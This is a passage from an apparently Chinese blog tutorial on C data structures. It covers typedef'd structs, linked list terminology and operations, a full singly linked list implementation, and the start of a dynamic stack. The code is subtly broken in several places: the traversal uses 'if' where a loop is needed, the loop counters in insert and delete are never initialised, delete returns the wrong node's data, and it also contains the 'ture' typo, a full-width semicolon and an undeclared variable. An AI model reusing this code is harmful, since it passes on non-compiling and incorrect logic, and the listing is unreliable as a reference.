class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line">}ST;<span class="comment">//struct Student是已经存在的数据类型，ST是别名</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//ZHANGSAN i = 10;</span></span><br><span class="line">    <span class="comment">//printf("%d\n", i);</span></span><br><span class="line">    </span><br><span class="line">    ST st;<span class="comment">//等价于struct Student st;</span></span><br><span class="line">    st.sid = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, st.sid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> sid;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> sex;</span><br><span class="line">}ST, * PST;<span class="comment">//PST等价于struct Student *</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    ST st;</span><br><span class="line">    PST ps = &amp;st;</span><br><span class="line">    ps-&gt;sid = <span class="number">199</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ps-&gt;sid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="2-2-2-链表"><a href="#2-2-2-链表" class="headerlink" title="2.2.2 链表"></a>2.2.2 链表</h3><p><strong>链表的定义</strong>：n个节点离散分配，彼此通过指针相连，每个节点只有一个前驱节点同时每个节点只有一个后续节点，首节点没有前驱节点，尾节点没有后续节点。</p><p>专业术语：</p><ul><li>首节点：存放第一个有效数据的节点</li><li>尾节点：存放最后一个有效数据的节点</li><li>头节点：位于首节点之前的一个节点，头结点并不存放有效的数据，加头结点的目的主要是为了方便对链表的操作</li><li>头指针：指向头结点的指针变量</li><li>尾指针：指向尾节点的指针变量</li></ul><img src="/posts/79666db/2.2.2.jpg" class="" title="专业术语"><p>确定一个链表需要几个参数：只需要一个头指针参数，因为我们通过头指针可以推算出链表的其他所有信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span><span class="comment">//指向下一个与自己一模一样的数据类型</span></span><br><span class="line">}NODE, * PNODE;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p><strong>链表的分类</strong>：</p><ul><li>单链表：每一个节点只有一个指针域</li><li>双链表：每一个节点有两个指针域</li><li>循环链表：能通过任何一个节点找到其他所有的节点</li><li>非循环链表：不能通过任何一个节点找到其他所有的节点</li></ul><p>循环链表属于双链表的一种特殊形式，即循环链表是双链表的一个子集。</p><h4 id="2-2-2-1-链表的插入"><a href="#2-2-2-1-链表的插入" class="headerlink" title="2.2.2.1 链表的插入"></a>2.2.2.1 链表的插入</h4><ol><li>r = p-&gt;pNext; p-&gt;pNext = q; q-&gt;pNext = r;</li><li>q-&gt;pNext = p-&gt;pNext; p-&gt;pNext = q;</li></ol><h4 id="2-2-2-2-链表的删除"><a href="#2-2-2-2-链表的删除" class="headerlink" title="2.2.2.2 链表的删除"></a>2.2.2.2 链表的删除</h4><ol><li>r = p-&gt;pNext; p-&gt;pNext = p-&gt;pNext-&gt;pNext; free(r);</li></ol><h3 id="2-2-3-链表的实现"><a href="#2-2-3-链表的实现" class="headerlink" title="2.2.3 链表的实现"></a>2.2.3 链表的实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> data;<span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span><span class="comment">//指针域</span></span><br><span class="line">}NODE,*PNODE；<span class="comment">//NODE相当于struct Node，*PNODE相当于struct Node *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建链表</span></span><br><span class="line">PNODE <span class="title function_">create_list</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="comment">//遍历链表</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//判断是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//返回链表长度</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">length_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"><span class="comment">//在指定节点处插入某个元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_list</span><span class="params">(PNODE,<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="comment">//删除指定位置的元素</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_list</span><span class="params">(PNODE,<span class="type">int</span>,<span class="type">int</span> *)</span>;</span><br><span class="line"><span class="comment">//对链表排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_list</span><span class="params">(PNODE pHead)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    PNODE pHead = <span class="literal">NULL</span>;<span class="comment">//定义头节点</span></span><br><span class="line">    pHead = create_list();</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    <span class="keyword">if</span>(is_empty(pHead))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"链表为空！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"链表非空！\n"</span>);</span><br><span class="line">    <span class="type">int</span> len = length_list(pHead);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"链表的长度是%d\n"</span>, len);</span><br><span class="line">    </span><br><span class="line">    sort_list(pHead);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    insert_list(pHead, <span class="number">4</span>, <span class="number">33</span>);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    delete_list(pHead, <span class="number">4</span>, &amp;val);</span><br><span class="line">    traverse_list(pHead);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">PNODE <span class="title function_">create_list</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> len;<span class="comment">//链表成员个数，由用户输入</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> val;<span class="comment">//链表成员值，由用户输入</span></span><br><span class="line"></span><br><span class="line">    PNODE pHead = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pHead)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"分配内存失败，程序结束"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入链表长度,len="</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;len);</span><br><span class="line"></span><br><span class="line">    PNODE pTail = pHead;</span><br><span class="line">    pTail-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    {</span><br><span class="line">        PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">NULL</span> == pNew)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"分配内存失败，程序结束"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        }</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"请输入要插入链表的值,val="</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;val);</span><br><span class="line"></span><br><span class="line">      pNew-&gt;data = val;</span><br><span class="line">      pTail-&gt;pNext = pNew;</span><br><span class="line">      pNew-&gt;pNext = <span class="literal">NULL</span>;</span><br><span class="line">      pTail = pNew;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> pHead;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">{</span><br><span class="line">    PNODE p = pHead-&gt;pNext;<span class="comment">//p指向首节点</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != p)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\t"</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_empty</span><span class="params">(PNODE pHead)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pHead-&gt;pNext)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">length_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">PNODE p = pHead-&gt;pNext;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">NULL</span> != p)</span><br><span class="line">{</span><br><span class="line">        ++len;</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert_list</span><span class="params">(PNODE pHead, <span class="type">int</span> pos, <span class="type">int</span> val)</span></span><br><span class="line">{<span class="comment">//这里算上了头结点，所以在第2个位置插入元素，也就是把下标为2及以后的元素往后移，将新节点放到下标为2的位置</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">PNODE p = pHead;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//循环到p指向pos-1的位置</span></span><br><span class="line"> <span class="keyword">while</span>( <span class="literal">NULL</span> != p &amp;&amp; i &lt; pos - <span class="number">1</span>)</span><br><span class="line"> {</span><br><span class="line">   p = p-&gt;pNext;</span><br><span class="line">     ++i;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == p || i &gt; pos <span class="number">-1</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="comment">//插入的数申请内存</span></span><br><span class="line">PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pNew)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"分配内存失败，程序终止！\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line">pNew-&gt;data = val;</span><br><span class="line">PNODE q = p-&gt;pNext;</span><br><span class="line">p-&gt;pNext = pNew;</span><br><span class="line">pNew-&gt;pNext = q;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ture;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete_list</span><span class="params">(PNODE pHead, <span class="type">int</span> pos, <span class="type">int</span> *pVal)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">PNODE p = pHead;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//循环到p指向pos-1的位置</span></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">NULL</span> != p-&gt;pNext &amp;&amp; i &lt; pos - <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">p = p-&gt;pNext;</span><br><span class="line">     ++i;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == p-&gt;pNext || i &gt; pos - <span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">}</span><br><span class="line">PNODE q = p-&gt;pNext;</span><br><span class="line">    *pVal = p-&gt;data;</span><br><span class="line">    p-&gt;pNext = q-&gt;pNext;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    q=<span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择排序</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sort_list</span><span class="params">(PNODE pHead)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i,j,t;</span><br><span class="line">    PNODE p,q;</span><br><span class="line">    <span class="type">int</span> len = length_list(pHead);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,p=pHead-&gt;pNext; i&lt;len<span class="number">-1</span>; i++,p=p-&gt;pNext)</span><br><span class="line">     {</span><br><span class="line">         <span class="keyword">for</span>(j=i+<span class="number">1</span>,q=p-&gt;pNext; j&lt;len; j++,q=q-&gt;pNext)</span><br><span class="line">         {</span><br><span class="line">             <span class="keyword">if</span>(p-&gt;data &gt; q-&gt;data)</span><br><span class="line">             {</span><br><span class="line">                 t = p-&gt;data;</span><br><span class="line">                 p-&gt;data = q-&gt;data;</span><br><span class="line">                 q-&gt;data = t;</span><br><span class="line">             }</span><br><span class="line">         }</span><br><span class="line">     }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h2 id="2-3-线性结构的两种常见应用之一-栈"><a href="#2-3-线性结构的两种常见应用之一-栈" class="headerlink" title="2.3. 线性结构的两种常见应用之一 栈"></a>2.3. 线性结构的两种常见应用之一 栈</h2><ul><li>定义：一种可以实现“先进后出”的存储结构</li><li>分类：静态栈；动态栈(链式栈)</li><li>算法：压栈；出栈</li><li>应用：函数调用；中断；表达式求值；内存分配；缓冲处理；迷宫</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> k)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">double</span> *q = (<span class="type">double</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">double</span>) * <span class="number">50</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> *p = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">k,m,q,i,p都分配在栈中，而malloc分配的空间是在堆中</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">动态栈利用头插法链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">pNext</span>;</span></span><br><span class="line">}NODE, * PNODE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    PNODE pTop;<span class="comment">//pTop是尾指针，指向尾结点</span></span><br><span class="line">    PNODE pBottom;<span class="comment">//pBottom是头指针，指向头结点</span></span><br><span class="line">}STACK, * PSTACK; <span class="comment">//PSTACK 等价于 struct STACK *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//函数声明</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PSTACK)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(PSTACK, <span class="type">int</span>)</span>; <span class="comment">//压栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse</span><span class="params">(PSTACK)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">pop</span><span class="params">(PSTACK, <span class="type">int</span> *)</span>; <span class="comment">//出栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear</span><span class="params">(PSTACK)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    STACK S; <span class="comment">//STACK 等价于 struct Stack</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">    init(&amp;S); <span class="comment">//目的是造出一个空栈</span></span><br><span class="line">    push(&amp;S, <span class="number">1</span>); <span class="comment">//压栈</span></span><br><span class="line">    push(&amp;S, <span class="number">2</span>);</span><br><span class="line">    push(&amp;S, <span class="number">3</span>);</span><br><span class="line">    push(&amp;S, <span class="number">4</span>);</span><br><span class="line">    push(&amp;S, <span class="number">5</span>);</span><br><span class="line">    push(&amp;S, <span class="number">6</span>);</span><br><span class="line">    traverse(&amp;S);<span class="comment">//遍历输出</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pop(&amp;S, &amp;val) )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"出栈成功，出栈的元素是%d\n"</span>,val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"出栈失败！\n"</span>);</span><br><span class="line">    </span><br><span class="line">    clear(&amp;S);</span><br><span class="line">    traverse(&amp;S);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(PSTACK pS)</span></span><br><span class="line">{</span><br><span class="line">    pS-&gt;pTop = (PNODE)<span 